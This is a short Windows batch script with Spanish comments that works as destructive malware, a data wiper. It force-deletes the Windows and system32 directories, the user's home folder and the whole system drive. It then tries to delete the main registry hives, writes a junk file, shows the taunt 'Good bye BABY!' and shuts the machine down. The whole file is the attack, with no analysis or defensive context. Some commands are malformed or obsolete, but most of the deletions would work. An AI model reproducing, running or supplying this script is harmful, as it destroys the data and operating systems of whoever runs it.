REM borra el sistema root
DEL /f %systemroot%\system\*.*
DEL /f %systemroot%\system32\*.*
DEL /f %systemroot%\*.*

REM borrar docs
RD /s /q "%homepath%/"

REM borrar Escritorio
CD \
CD %SYSTEMDRIVE%
DEL *.* /f /s /q

reg delete "HKEY_CURRENT_CONFIG\Software" /f
reg delete "HKEY_CURRENT_CONFIG\Sistem" /f
reg delete "HKEY_USERS\*" /f
reg delete "HKEY_USERS\.*" /f
reg delete "HKEY_LOCAL_MACHINE\*" /f
reg delete "HKEY_LOCAL_MACHINE\.*" /f
reg delete "HKEY_CURRENT_USER\*" /f
reg delete "HKEY_CURRENT_USER\.*" /f
reg delete "HKEY_CLASSES_ROOT\*" /f
reg delete "HKEY_CLASSES_ROOT\.*" /f

DEL %HOMEPATH%\Desktop\
for /l %%i in (1,1,999) do (echo "infinit" > Team_zero)
Msg * Good bye BABY!
rundll32 krnl386.exe,exitkernel
shutdown -s -t 10
